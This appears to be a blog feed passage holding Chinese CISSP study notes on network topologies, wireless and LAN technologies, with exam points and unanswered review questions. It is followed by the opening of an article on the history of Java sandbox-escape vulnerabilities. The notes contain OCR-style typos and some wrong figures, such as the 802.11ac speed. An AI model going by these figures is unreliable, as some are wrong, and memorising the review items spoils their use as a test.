线型和树型。线型总线型拓扑结构采用单条主干线路， 所有的系统都直接连接到干线上。树型总线型拓扑结构采用单条主干线路， 其分支可以支持多个系统。总线在今天很少使用的主要原因是: 它必须在两端有终接器并且在整个网络中容易出现断网的情况。</p><img src="/notes/cissp学习笔记（11）——网络安全架构与保护网络组件/线型总线型拓扑和树型总线型拓扑.png"></li><li><p><strong>星型拓扑</strong> 星型拓扑结构采用了一个集中式连接设备， 这个设备可以是一台简单的集线器或交换机。每个系统都通过一个专用的网段连接到中央集线器。如果任意一个网段出现故障， 那么其他网段仍然可以继续运作。然而， 中央的集线器却是一个单点故障点。总的来说， 星型拓扑结构使用了比其他拓扑结构更少的线缆连接， 并且更容易确定受损的线缆。一条逻辑总线和一个逻辑环可以被实现为一个物理的星型拓扑结构。以太网是基于总线的技术，它可以被部署为一个物理的星型拓扑结构， 但是集线器设备实际上是逻辑总线连接设备。同样， 令牌环是基于环的技术， 它可以通过使用多站访问部件(Multistation Access Unit， MAU)被部署为一个物理的星型拓扑结构。MAU准许线缆段被部署为星型， 同时以内部的设备形成逻辑环连接。</p><img src="/notes/cissp学习笔记（11）——网络安全架构与保护网络组件/星型拓扑结构图.png"></li><li><p><strong>网状型拓</strong> 扑结构网状型拓扑结构使用很多路径将一个系统与其他系统连接在一起。全交叉拓扑结构将每个系统与网络中的其他所有系统都连接在一起。部分交叉拓扑结构将很多系统连接到其他很多系统。网状型拓扑结构为系统提供了冗余连接， 这样， 即使多个网段出现故障， 也不会对连通性造成严重的影响。</p><img src="/notes/cissp学习笔记（11）——网络安全架构与保护网络组件/网状型拓扑结构.png"></li></ul><h4 id="11-7-3-无线通信与安全性"><a href="#11-7-3-无线通信与安全性" class="headerlink" title="11.7.3 无线通信与安全性"></a>11.7.3 无线通信与安全性</h4><h5 id="1-无线的一般概念"><a href="#1-无线的一般概念" class="headerlink" title="1. 无线的一般概念"></a>1. 无线的一般概念</h5><p>　　无线通信使用无线电波远距离传输信号。无线电波频谱是有限的， 因此对其使用时必须进行适当的管理， 从而保证在没有干扰或干扰很小的情况下允许多个使用同时存在。无线电波频谱使用频率进行测量或区分。用频率测量波在特定时间内振动的次数(使用单位Hz进行确定)或者每秒的振动次数。无线电波的频率在3Hz到300GHz之间。不同的频率范围被分配给特定的用途。<br>　　扩频指的是通信可以通过多个频率同时发生。因此， 一条报文可以被分为若干片段， 所有片段同时进行发送， 不过每个片段都使用不同的频率。实际上， 这是一种并行通信而不是串行通信。<br>　　跳频扩频(Frequency Hopping Spread Spectrum， FHSS)是扩频概念的早期实现。然而， 这种技术并非以并行方式发送数据， 而是以串行方式传输数据， 同时不断改变所使用的频率。可用频率的整个范围都会被使用， 但是每次只使用一个频率。发送者改变频率时， 为了接收到信号， 接收者必须遵循相同的跳频模式。FHSS被设计用于帮助最小化干扰， 而不是只使用会受到影响的单一频率。在实际使用中， 通过不断切换频率， 干扰就被最小化。<br>　　直接序列扩频(Direct Sequence Spread Spectrum， DSSS) 以并行方式同时利用所有可用频率。与FHSS相比， DSSS提供了更高的数据吞吐率。DSSS也使用被称为碎片码的特殊编码机制来允许接收方重构数据， 即使是部分信号由于干扰被破坏也同样适用。这种情况与RAID-5的奇偶位允许重新创建所丢失驱动器上的数据几乎完全相同。<br>　　正交频分复用(Orthogonal Frequency-Division Multiplexing， OFDM)仍然是另一种频率使用的变化形式。OFDM利用了允许传输进行更紧密压缩的数字多载波调制模式。已调制信号是正交的， 因此不会导致相互干扰。最后， OFDM需要的频率组(也就是信道带宽)更小， 却能够提供更大的数据吞吐率。</p><h5 id="2-蜂窝电话"><a href="#2-蜂窝电话" class="headerlink" title="2. 蜂窝电话"></a>2. 蜂窝电话</h5><p>　　蜂窝电话无线通信会通过使用特定无线电波频率组的便携设备与蜂窝电话运营商的网络以及其他蜂窝电话设备或互联网交互。蜂窝电话所使用的技术很多， 而且往往会引起混淆。一个比较容易混淆的地方是2G和3G术语的使用。并非所有蜂窝电话通信数据都是语音: 蜂窝电话常常被用于传输文本甚至计算机数据。其次， 对于蜂窝电话提供商网络上的通信， 不管是语音、文本还是数据， 都不一定是安全的。再次， 使用特定的无线嗅探装备能够截获蜂窝电话传输的信息。实际上， 连接的服务商基站能够被模拟进而导致中间人攻击。最后， 如果使用蜂窝电话连通性访问互联网或办公网络， 那么攻击者甚至还可能获得其他的攻击、访问和破坏手段。这些设备中的一些能潜在地成为网桥， 进而创建一条不安全的通道来进入你的网络。<br>　　无线应用协议(Wireless Application Protocol， WAP)o WAP不是一个标准， 而是一个功能行业驱动的协议枝。借助具备WAP能力的设备， 从蜂窝电话或PDA通过互联网上的蜂窝电话运营商网络和网关接入公司网络， 用户就能够与公司网络通信。WAP是一套共同工作的协议族， 其中无线传输层安全(Wireless Transport Layer Security， WTLS)协议能够提供与SSL或TLS相似的安全连通性服务。</p><h5 id="3-蓝牙-802-15"><a href="#3-蓝牙-802-15" class="headerlink" title="3. 蓝牙(802.15)"></a>3. 蓝牙(802.15)</h5><p>　　蓝牙或IEEE 802.15 个人局域网(PAN)是与无线安全性有关的另一个区域。蜂窝电话的听筒、麦克风、鼠标、键盘、GPS设备以及其他许多接口设备和外围设备都通过蓝牙连接。被称为蓝牙劫持的技术能够在仿刁三知’惰的情况下配对你的设备， 并且可以使用这些设备， 或者可以从这些设备中提取信息。这种攻击形式能够使攻击者访问你的联系人列表、数据甚至谈话。蓝牙窃听这种攻击允许黑客远程控制蓝牙设备的特性和功能。这可能包括打开麦克风的能力， 使用手机作为音频监控。幸运的是， 蓝牙通常只具有30英尺的限定范围， 不过某些设备在100米之外也能够运作。虽然蓝牙使用了加密， 但并不是动态加密， 而且往往通过适当的工作就能够破解。蓝牙用于非敏感或非机密的活动。只要有可能， 最好修改设备的默认PIN。不要使设备停留在发现模式， 在没有活动使用时总是关闭蓝牙。</p><h5 id="4-无绳电话"><a href="#4-无绳电话" class="headerlink" title="4. 无绳电话"></a>4. 无绳电话</h5><p>　　无绳电话存在往往被忽视的安全问题。无绳电话被设计使用任何一个免执照频率(也就是900MHz、2.4GHz或5GHz)。许多不同类型的设备都使用了这三个免执照频率， 包括无绳电话、婴儿监视器、蓝牙设备和无线网络连接设备。常常被忽视的问题是: 因为信号极少加密， 所以无绳电话很容易被偷听。使用频率扫描仪， 任何人都能够监听你的谈话。</p><h5 id="5-移动设备"><a href="#5-移动设备" class="headerlink" title="5. 移动设备"></a>5. 移动设备</h5><p>　　移动设备通常支持内存卡， 并且可能会将恶意代码注入或将机密数据带出企业。许多移动设备还支持USB 连接桌面终端或笔记本电脑以进行同步通信， 例如传输文件、文档、音乐、视频等。设备本身通常包含敏感数据， 例如通信录、短信、电子邮件， 甚至记录和文件。移动设备的遗失或失窃意味着个人和企业机密的破坏。移动设备己成为黑客和恶意代码的攻击目标。不在移动设备上保存敏感信息是十分重要的。在设备上运行防火墙和防病毒产品(如果可提供的话)并且保持系统锁定或加密(如果可行的话)。</p><h4 id="11-7-4-LAN-技术"><a href="#11-7-4-LAN-技术" class="headerlink" title="11.7.4 LAN 技术"></a>11.7.4 LAN 技术</h4><h5 id="1-以太网"><a href="#1-以太网" class="headerlink" title="1. 以太网"></a>1. 以太网</h5><p>　　以太网是一种共享介质的LAN 技术， 也称为广播技术。这意味着它准许很多设备在相同的介质上进行通信， 但是要求每台设备轮流通信并且执行冲突检测和避免操作。以太网采用广播域和冲突域。广播域是一个物理的系统组， 这个组中的所有系统成员都会接收到由组中单个系统发送的广播。广播是传输到特定地址的消息， 它指示所有的系统都是预计的接收者。冲突域包含若干系统组， 在冲突域内， 如果两个系统同时进行传输， 就会发生数据冲突。当两条被传输的消息企图同时使用网络介质时， 就会出现数据冲突， 这会导致其中一条或两条消息出现说误。以太网可以支持全双工通信(也就是完全双向的通信)， 并且往往使用同轴电缆或双绞线连接。以太网最常在星型或总线型拓扑上部署。</p><h5 id="2-令牌环"><a href="#2-令牌环" class="headerlink" title="2. 令牌环"></a>2. 令牌环</h5><p>　　令牌环来用令牌传递机制来控制哪些系统可以在网络介质上传输数据。令牌在LAN 所有成员形成的逻辑环上进行传递。令牌环可以来用环型或星型网络拓扑。由于令牌环的性能有限， 比起以太网来说成本又高， 而且会增加部署和管理的难度， 今天己极少使用。令牌环可通过使用多站访问组件(MAU)部署物理星型结构。MAU允许电缆段部署为星型结构，同时内部设备使用逻辑令牌连接。</p><h5 id="3-光纤分布式数据接口-FDDI"><a href="#3-光纤分布式数据接口-FDDI" class="headerlink" title="3. 光纤分布式数据接口(FDDI)"></a>3. 光纤分布式数据接口(FDDI)</h5><p>　　光纤分布式数据接口(FDDI)是一种使用两个环的高速令牌传递技术，其中信息流在两个环上沿相反的方向传输。FDDI常用作大型企业网络的主干， 它的双环设计允许实现自愈， 即从环中去除故障网段， 并且利用剩下的部分内部环和外部环建立单个环。虽然FDDI价格昂贵， 但是在快速以太网和千兆以太网出现之前常常被用在校园环境中。价格稍便直、距离有限且速度更慢的版本称为铜线分布式数据接口(CDDI)。CDDI也更容易遭到干扰和偷听。</p><h5 id="4-辅助技术"><a href="#4-辅助技术" class="headerlink" title="4. 辅助技术"></a>4. 辅助技术</h5><p>　　大多数网络并非只包含一种技术， 而是包含众多技术。例如， 以太网并不只是一个单独的技术，而是支持其通用以及预期活动和行为的多个辅助技术的超集。以太网包括数字通信、同步通信和基带通信技术， 并且支持广播、多播和单播通信以及带有冲突检测的载披侦昕多路存取(Carrier-Sense Multiple Access with Collision Detection ， CSMA/CD)。许多LAN技术， 例如以太网、令牌环和FDDI都可能包括下面所介绍的辅助技术。</p><h5 id="5-模拟和数字"><a href="#5-模拟和数字" class="headerlink" title="5. 模拟和数字"></a>5. 模拟和数字</h5><p>　　对于许多网络通信形式来说， 常见的一种辅助技术是在物理介质(例如， 线缆)上实际传输信号所使用的机制。传输机制分为两种类型:模拟和数字。</p><ul><li>使用频率、幅度、相位、电压等发生变化的连续信号时，就会进行模拟通信。连续信号的差异会产生波形(与数字信号的方波形成对照)。连续信号的差异导致实际通信的发生。</li><li>通过使用非连续的电子信号以及状态改变或开关脉冲， 就会出现数字通信。</li></ul><h5 id="6-同步和异步"><a href="#6-同步和异步" class="headerlink" title="6. 同步和异步"></a>6. 同步和异步</h5><p>　　某些通信使用时钟或定时活动进行同步。通信既可以是同步的， 也可以是异步的。</p><ul><li>同步通信依赖于定时或时钟机制， 这种机制基于独立的时钟或数据流内嵌的时间标记。同步通信通常能够支持非常高速的数据传送。</li><li>异步通信依赖于停止和开始定界位来管理数据的传输。因为使用了定界位以及传输的停止和开始特征， 所以异步通信最适用于数据量较少的传输。公用电话交换网(PSTN)调制解调器就是异步通信的一个绝佳示例。</li></ul><h5 id="7-基带和宽带"><a href="#7-基带和宽带" class="headerlink" title="7. 基带和宽带"></a>7. 基带和宽带</h5><p>　　在一个线缆段上能够同时发生的通信数取决于使用的是基带技术还是宽带技术。</p><ul><li>基带技术只能支持单个通信信道， 它使用直流电应用于线缆， 其中有电流表示二进制信号1，无电流表示二进制信号0。基带是一种数字信号形式。以太网就是基带技术。</li><li>宽带技术能够支持多个同时发生的信号。宽带使用频率调制来支持许多信道， 每个信道都支持一个截然不同的通信会话。宽带适用于高吞吐率， 尤其适用于若干信道复用的情况。宽带是一种模拟信号形式。有线电视和线缆调制解调器、ISDN、DSL、T1以及T3都是宽带技术的示例。</li></ul><h5 id="8-广播、多播和单播"><a href="#8-广播、多播和单播" class="headerlink" title="8. 广播、多播和单播"></a>8. 广播、多播和单播</h5><p>　　另一种辅助技术确定了单个传输能够到达的目的地数量， 具体的选项是广播、多播和单播。</p><ul><li>广播技术支持与所有可能的接收者进行通信。</li><li>多播技术支持与多个特定的接收者进行通信。</li><li>单播技术只支持与某个特定接收者的单一通信。</li></ul><h5 id="9-LAN介质访问"><a href="#9-LAN介质访问" class="headerlink" title="9. LAN介质访问"></a>9. LAN介质访问</h5><ul><li><strong>载波侦昕多路存取(CSMA)</strong> CSMA并不直接解决冲突。如果发生冲突， 那么通信就不成功， 因此也不会接收到确认信号。这样会导致发送系统重新传输数据和重新执行CSMA过程。这是一种使用下列步骤进行通信的LAN介质访问技术:<ul><li>(1) 主机侦听LAN 介质， 从而确定LAN 介质是否正在使用。</li><li>(2) 如果LAN 介质未被使用， 那么主机就传输其通信数据。</li><li>(3) 主机等待确认信号。</li><li>(4) 如果超时未接收到确认信号， 那么主机从步骤(1)开始重新执行操作。</li></ul></li><li><strong>带有冲突避免的载波侦昕多路存取(CSMA/CA)</strong> AppleTalk和802.11无线网络连接是利用CSMA/CA技术的网络例子。CSMA/CA试图通过在任意指定时间内只授予单个通信特权来避免冲突。CSMA/CA系统要求指定一个主系统， 这个主系统能够响应请求以及授予发送数据传输的特权。这是一种使用下列步骤进行通信的LAN介质访问技术:<ul><li>(1) 主机具有两个与LAN介质的连接: 入站连接和出站连接。主机侦昕入站连接， 从而确定LAN介质是否正在使用。</li><li>(2) 如果LAN介质未被使用， 那么主机就请求传输特权。</li><li>(3) 如果超时之后仍未获得特权， 那么主机从步骤(1)开始重新执行操作。</li><li>(4) 如果被授予特权， 那么主机就通过出站连接传输其通信数据。</li><li>(5) 主机等待确认信号。</li><li>(6) 如果超时之后仍未收到确认信号，那么主机从步骤(1)开始重新执行操作。</li></ul></li><li><strong>带有冲突检测的载波侦昕多路存取(CSMA/CD)</strong> 以太网利用了CSMA/CD技术。通过使冲突域的每个成员在重新开始传输过程之前都进行随机的短时间等待， CSMA/CD可以响应冲突。遗憾的是， 准许冲突发生以及随后对冲突的响应或反应会导致传输延迟以及要求重复传输， 这会导致损失40%左右的潜在吞吐量。这是一种使用下列步骤进行通信的LAN介质访问技术:<ul><li>(1) 主机侦昕LAN介质， 从而确定LAN 介质是否正在使用。</li><li>(2) 如果LAN介质未被使用， 那么主机就传输其通信数据。</li><li>(3) 在数据传输的同时， 主机侦昕冲突(也就是两台或多台主机同时传送数据的情况) 。</li><li>(4) 如果检测到冲突， 那么主机就会传输一个停发信号。</li><li>(5) 如果接收到停发信号， 所有主机都会停止数据传输。每台主机都会等待一个随机的时间周期， 然后从步骤(1)开始重新执行操作。</li></ul></li><li><strong>令牌传递</strong> 这是一种使用数字令牌进行通信的L州介质访问技术。持有令牌的主机有权传输数据。一旦传输完成， 主机就会将令牌释放给下一个系统。令牌传递用在令牌环网络中， 例如FDDI。由于持有令牌的系统才有权传输数据，因此令牌环能够防止冲突。</li><li><strong>轮询</strong> 这是一种使用主从配置进行通信的L剧介质访问技术。一个系统被标记为主系统， 其他所有系统则被A示记为从属系统。主系统依次轮询或了解每个从属系统是否需要传输数据。如果某个从属系统表达了这种需求， 那么就会被授予传输数据的特权。一旦该系统的传输结束， 主系统就继续轮询下一个从属系统。同步数据链接控制(SDLC)就使用了轮询。轮询通过使用许可系统来解决冲突。轮询是CSMA/CA 方法的逆过程。虽然二者都使用主从结构， 但是CSMA/CA 允许从系统请求特权， 而轮询则由主系统提供特权。轮询可以被配置为授予某个(或多个)系统具有比其他系统更高的优先权。例如， 如果标准的轮询模式为1、2、3、4， 那么就可以指定系统1优先， 轮询模式相应会变化为1、2 、1、3、1、4。</li></ul><h3 id="11-8-考试要点"><a href="#11-8-考试要点" class="headerlink" title="11.8 考试要点"></a>11.8 考试要点</h3><ul><li><strong>了解OSI模型的各层和每一层所使用的协议</strong> OSI模型的7层以及各层所支持的协议如下:<ul><li>应用层: HTIP、FTP、LPD、SMTP， Telnet、TFTP、EDL、POP3、IMAP、SNMP、NNTP、S-RPC和SET。</li><li>表示层: 加密协议(例如， RSA和DES)与格式化类型(例如， ASCrr、EBCDICM、TIFF、JPEG、MPEG和MIDI)。</li><li>会话层: NFS、SQL和RPC。</li><li>传输层: SPX、SSL、TLS、TCP和UDP。</li><li>网络层: ICMP、RIP、OSPF、BGP、IGMP、IP、IPSec、IPX、NAT和SKIP。</li><li>数据链路层: SLIP、PPP、ARP、RARP、L2F、L2TP、PPTP、FDDI和ISDN。</li><li>物理层: EIA/TIA-232、EIA/TIA-449、X.21、HSSI、SONET、V.24和V.35。</li></ul></li><li><strong>全面了解TCP/IP</strong> 了解TCP和UDP之间的差异。熟悉4个TCP/IP层及其与OSI模型的对应关系。此外， 还要理解知名端口的使用， 并且熟悉相关的子协议。</li><li><strong>了解不同的线缆类型及其长度和最大吞吐率</strong> 线缆连接类型包括STP、10Base-T(UTP)、10Base2(细缆)、10Base5(粗缆)、100Base-T、1000Base-T和光纤。还应当熟悉从1类到7类的UTP。</li><li><strong>熟悉常用的LAN 技术</strong> 常用的LAN技术是以太网、令牌环和FDDI。此外还应当熟悉;模拟通信与数字通信;同步通信与异步通信;基带通信与宽带通信;广播、多播和单播通信;CSMA、CSMA/CA 和CSMA/CD;令牌传递;轮询。</li><li><strong>了解安全的网络体系结构和设计</strong> 网络安全应考虑IP和非IP协议、网络访问控制、使用安全的服务和设备、管理多层协议以及实现端点安全。</li><li><strong>了解网络分段的各种类型和目的</strong> 网络分段可以用来管理流量、提高性能并加强安全性。网络分段或子网的例子包括内部网、外部网和DMZ。</li><li><strong>了解不同的无线技术</strong> 手机、蓝牙(802.15)和无线网络(802.11)都称为无线技术， 即使它们是完全不同的。了解它们的差异、优势和弱点。了解安全802.11网络的基础知识。</li><li><strong>了解光纤通道</strong> 光纤通道是一种网络数据存储解决方案(例如SAN(存储区域网络)或NAS(网络附加存储))， 允许高速文件传输。</li><li><strong>了解FCoE</strong> FCoE( 以太网光纤通道)用来封装光纤通道中的以太网网络通信。</li><li><strong>了解iSCSI</strong> iSCSI(互联网小型计算机系统接口)是一个基于IP的网络存储标准。</li><li><strong>了解802.11 和802.11a、b、g、n和ac</strong> 802.11是IEEE标准的无线网络通信。版本包括802.11(2Mbps)、802.11a(54Mbps)、802.11b(l1Mbps)、802.11g(54Mbps)、802.11n(600Mbps)和802.11ac(1.3+Mbps)。802.11标准定义了有线等效保密(WEP)。</li><li><strong>了解现场勘测</strong> 现场勘测是调查环境中的位置和信号强度以达到部署无线接入点所需条件的过程。这个任务通常涉及利用便携式无线设备进行步行探寻以观测无线信号的强度， 并映射这一场景或建筑的示意图。</li><li><strong>了解WPA</strong> WEP的早期选择WPA。这种技术虽有改进但本身仍是不完全可靠的。它基于LEAP和TKIP 密码体系并使用一个密码短语。</li><li><strong>理解WPA2</strong> WPA2是一种新的加密方案， 称为计数器模式密码块链接消息认证码协议(CCMP)，是基于AES的加密方案。</li><li><strong>了解WEP</strong> 有线等效保密(WEP)是由IEEE 802.11定义的标准， 目的是在无线网络上提供等同于有线或有线网络同一水平的安全和加密。WEP提供对抗数据包嗅探和窃听攻击的无线传输保护。WEP的第二个好处是能够防止未经授权的无线网络访问。WEP使用预定义的共享密钥。</li><li><strong>了解EAP</strong> EAP(可扩展认证协议)不是一个特定的认证机制;它是一个认证框架。实际上， EAP允许新的认证技术与现有的无线或点对点连接技术相兼容。</li><li><strong>了解PEAP</strong> PEAP(受保护的可扩展认证协议)通过TLS隧道封装EAP， 提供了认证和加密的可能性。</li><li><strong>了解LEAP</strong> LEAP(轻量级可扩展认证协议)是Cisco专有的， 用于WPA替代TKlP。协议的设计是为了在802.11i/WAP2被批准为标准之前以应对TKIP的不足。</li><li><strong>了解MAC 过滤</strong> MAC 过滤器是一个授权的无线客户端接口MAC地址列表， 用于无线接入点以阻止所有非授权设备的访问。</li><li><strong>了解SSID 广播</strong> 无线网络定期在一个称为信标帧的特殊数据包内公布它们的SSID。当SSID进行广播时， 具有自动检测和连接的任何设备不仅能够看到网络， 也可以主动与网络进行连接。</li><li><strong>了解TKIP</strong> TKIP(临时密钥完整性协议)被设计用于替代WEP且不需要更换传统的无线硬件。TKIP在802.11无线网络中得到应用并被称为WPA(Wi-Fi Protected Access)。</li><li><strong>了解CCMP</strong> 设计CCMP(计数器模式密码块链接消息认证码协议)是为了取代WEP和TKIP闭性。CCMP使用AES(高级加密标准)和128位的密钥。</li><li><strong>了解强制门户</strong> 强制门户是一个认证技术， 它将一个新的无线Web客户端连接重定向到一个访问控制接口页面。</li><li><strong>了解天线的类型</strong> 各种类型的天线可用于无线客户端和基站。这些天线包括全向天线以及许多定向天线， 如Yagi天线、cantenna天线、面板天线和抛物线天线。</li><li><strong>了解现场勘测</strong> 现场勘测使用盯信号探测器对无线信号的强度、质量和干扰进行正式评估。</li><li><strong>了解标准的网络拓扑结构</strong> 有环型、总线型、星型和网状型几类。</li><li><strong>了解常用的网络设备</strong> 常用的网络设备包括防火墙、路由器、集线器、桥、中继器、交换机、网关和代理。</li><li><strong>理解不同类型的防火墙</strong> 防火墙有4种基本类型: 静态的数据包过滤、应用级网关、电路级网关以及状态检测防火墙。</li><li><strong>了解用于连接LAN和WAN通信技术的协议服务</strong> 它们是帧中继、SMDS、X.25、ATM、HSSI、SDLC、HDLC和ISDN。</li></ul><h3 id="11-9-复习题"><a href="#11-9-复习题" class="headerlink" title="11.9 复习题"></a>11.9 复习题</h3><ol><li><p>下列哪一层是OSI模型的第4层?<br>A. 表示层<br>B. 网络层<br>C. 数据链路层<br>D. 传输层</p></li><li><p>什么是封装?<br>A. 改变数据包的源地址和目标地址<br>B. 当数据在OSI模型中向下移动时增加报头和报尾<br>C. 验证一个人的凭证<br>D. 保护证据， 直到它们已经被恰当收集</p></li><li><p>0SI模型的哪一层用简单模式、半双工模式、全双工模式管理通信?<br>A. 应用层<br>B. 会话层<br>C. 传输层<br>D. 物理层</p></li><li><p>以下哪一个最不能抵抗EMI?<br>A. 细缆<br>B. 10Base-T UTP<br>C. 10Base5<br>D. 同轴电缆</p></li><li><p>以下哪一个不是网络分段的示例?<br>A. 内部网<br>B. DMZ<br>C. 外部网<br>D. VPN</p></li><li><p>以下哪一个不是非IP协议?<br>A. IPX<br>B. UDP<br>C. AppleTalk<br>D. NetBEUI</p></li><li><p>如果你是bluejacking攻击的受害者， 以下哪个设备被攻陷了?<br>A. 防火墙<br>B. 交换机<br>C. 蜂窝电话<br>D. web cookies</p></li><li><p>下列哪个网络技术基于IEEE 802.3标准?<br>A. 以太网<br>B. 令牌环<br>C. FDDI<br>D. HDLC</p></li><li><p>什么是TCP包装器?<br>A. 一个在交换机上使用的封装协议<br>B. 一个应用， 可以作为基本的防火墙功能并通过用户ID和系统ID来实现访问控制<br>C.一个安全协议， 用于在WAN链路上保护TCP/IP通信<br>D. 一个TCP/IP隧道机制， 用于非IP网络</p></li><li><p>什么是多层协议具备的优点， 同时也是潜在的威胁?<br>A. 吞吐量<br>B. 封装<br>C. 哈希完整性检测<br>D. 逻辑地址</p></li><li><p>通过检查源地址和目标地址、应用程序使用情况、来源以及同一会话中前数据包和当前数据包之间的关系，____防火墙能够授予广泛的访问授权并积极监视用户， 以及活动和阻止未经授权的用户和活动。<br>A. 静态数据包过滤<br>B. 应用级网关<br>C. 状态检查<br>D. 电路级网关</p></li><li><p>防火墙是第三代防火墙。<br>A. 应用级网关<br>B. 状态检测<br>C. 电路级网关<br>D. 静态数据包过滤</p></li><li><p>关于防火墙， 下列哪一项不是正确的?<br>A. 它们都能够记录流量信息。<br>B. 它们能阻隔病毒。<br>C. 它们能基于可疑攻击发出问题警报<br>D. 它们仍不能防止内部攻击</p></li><li><p>以下哪个不是可路由协议?<br>A. OSPF<br>B. BGP<br>C. RPC<br>D. RIP</p></li><li><p>是智能集线器， 因为它知道在每个出站端口上连接的系统的地址。它不是重复每个出站端口上的流量， 而只重复目的地己知的出站流量。<br>A. 中继器<br>B. 交换机<br>C. 桥<br>D. 路由器</p></li><li><p>下列哪一项不是802. 11无线网络相关的技术?<br>A. WAP<br>B. WPA<br>C. WEP<br>D. 802. 11i</p></li><li><p>哪种无线频率访问方法提供不受干扰的最大吞吐量?<br>A. FHSS<br>B. DSSS<br>C. OFDM<br>D. OSPF</p></li><li><p>什么安全概念鼓励管理员在每台主机上安装防火墙、防病毒扫描器和IDS?<br>A. 端点安全<br>B. 网络访问控制(NAC)<br>C. VLAN<br>D. RADIUS</p></li><li><p>RARP执行什么功能?<br>A. 它是一种路由协议。<br>B. 它将IP地址转换为MAC地址。<br>C. 它将物理地址解析成逻辑地址。<br>D. 它管理多重流。</p></li><li><p>在大型的物理环境中， 无线网络部署何种形式的基础设施模式支持众多接入点只使用单一的SSID?<br>A. 独立<br>B. 有线扩展<br>c. 企业扩展<br>D. 桥</p></li></ol>]]></content>
    
    <summary type="html">
    
      本文为cissp中网络安全架构与保护网络组件章节的学习笔记
    
    </summary>
    
      <category term="notes" scheme="https://www.diyz.bid/categories/notes/"/>
    
    
      <category term="cissp" scheme="https://www.diyz.bid/tags/cissp/"/>
    
      <category term="学习笔记" scheme="https://www.diyz.bid/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>关于Java沙箱逃逸的这20年</title>
    <link href="https://www.diyz.bid/Security/%E5%85%B3%E4%BA%8EJava%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E8%BF%9920%E5%B9%B4/"/>
    <id>https://www.diyz.bid/Security/关于Java沙箱逃逸的这20年/</id>
    <published>2018-09-30T02:10:50.000Z</published>
    <updated>2018-10-11T10:12:52.901Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>　　Java平台广泛部署在各种服务器、桌面工作站和消费电子产品上。它旨在实现精心设计的安全模型，即Java沙箱能够在主机不受到威胁的前提下执行各种具有潜在威胁的代码。具体地说，这种沙盒方法用于安全执行不受信任的Java应用程序，例如Web浏览器中的Java applet。不幸的是，尽管这二十年来安全人员已经付出了巨大的努力不断修复漏洞和改进平台安全性，但是各种沙箱绕过漏洞仍然层出不穷。<br>　　在这项工作中，我们回顾了Java不安全的过去和现在。我们出于教育目的列举所有已知并在当前版本中已修复的安全漏洞，目标是为了概述Java平台安全性问题，这样我们就可以从过去的错误中吸取教训。</p><h3 id="2-背景"><a href="#2-背景" class="headerlink" title="2. 背景"></a>2. 背景</h3><h4 id="2-1-Java沙箱漏洞简史"><a href="#2-1-Java沙箱漏洞简史" class="headerlink" title="2.1 Java沙箱漏洞简史"></a>2.1 Java沙箱漏洞简史</h4><p>　　Sun的第一个版本是由Sun Microsystems于1995年发布的。一年后，普林斯顿大学的研究人员发现了多个缺陷<br>能够绕过沙箱。作者发现了语言，字节码和对象初始化方面的弱点，仅举几例，其中一些在撰写本文时仍然存在于Java中。这是第一次详细描述针对Java运行时的类欺骗攻击。几年后，在2002年，The Last Stage of Delirium（LSD）研究小组提出了他们关于Java虚拟机安全性的发现。他们详细介绍了影响字节码验证程序和类加载程序的漏洞，导致类型混淆或类欺骗攻击。2010年，Koivu首次通过解释如何利用他发现的CVE-2010-0840漏洞公开表明可信方法链攻击对Java起作用。2011年，Drake描述了如何利用Java中的内存破坏漏洞。他解释了如何利用CVE-2009-3869和CVE-2010-3552两个堆栈缓冲区溢出漏洞。2012年，Guillardoy描述了CVE-2012-4681，这两个漏洞允许绕过沙箱。第一个漏洞允许访问受限制的类，第二个漏洞允许修改私有字段。同样在2012年，Oh描述了如何利用CVE-2012-0507的漏洞执行类型混淆攻击来绕过Java沙箱。2013年，Gorenc和Spelman对120个Java漏洞进行了大规模研究，并得出结论，不安全反射是Java中最常见的漏洞，但这种混淆是最常见的漏洞利用。仍然在2013年，Lee和Nie发现了多个漏洞，包括本机方法中的漏洞，可以绕过沙箱。同样在2013年，Kaiser描述了CVE-2013-1438，一个由James Forshaw发现的可靠方法链漏洞，CVE-2012-5088是Security Explorations发现的Java反射漏洞。在2012年至2013年期间，Security Explorations的安全研究人员发现了20多个Java漏洞。从2014年开始，主要网络浏览器（如Chrome或Firefox）的开发人员决定默认禁用NAPI（因此默认情况下不能执行任何Java代码）。Java的攻击面正在减少，似乎对Java沙箱旁路的研究较少。但是，绕过沙盒的漏洞仍然会偶尔弹出。例如，在2018年，Lee描述了如何利用CVE-2018-2826，这是XOR19发现的类型混淆漏洞。</p><h4 id="2-2-Java平台"><a href="#2-2-Java平台" class="headerlink" title="2.2 Java平台"></a>2.2 Java平台</h4><p>　　Java平台可以分为两个抽象组件：Java虚拟机（JVM）和Java类库（JCL）。<br>　　JVM是该平台的核心。它以本机代码实现，并提供程序执行所需的所有基本功能，例如字节码解析器，JIT编译器，垃圾收集器等。由于它是本机实现的，因此它也受到与任何其他本机二进制相同的攻击，例如包括缓冲区溢出等内存损坏漏洞。<br>　　JCL是与JVM一起提供的标准库。它包含数百个系统类，主要用Java实现，其中较小的部分是本机实现的。由于所有系统类都是受信任的，因此默认情况下它们与所有权限相关联。这些权限使他们可以完全访问任何类型的功能（文件系统读/写，完全访问网络等），从而完全访问主机。因此，分析人员可能会使用系统类中的任何安全错误来打破沙箱。<br>　　因此，本文的主要内容分为两个较大的部分:一个处理内存损坏漏洞，另一个侧重于Java级别的漏洞。</p><h4 id="2-3-安全管理"><a href="#2-3-安全管理" class="headerlink" title="2.3 安全管理"></a>2.3 安全管理</h4><p>　　在JCL的代码中，沙箱是通过授权检查实现的，其中大多数是权限检查。例如，在对文件系统进行任何访问之前，JCL中的代码会检查调用者是否具有访问文件系统的权限。下面是检类<em>java.io.FileInputStream</em>中文件的读取权限的示例。构造函数检查调用者是否具有读取第5行上的指定文件的读取权限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span 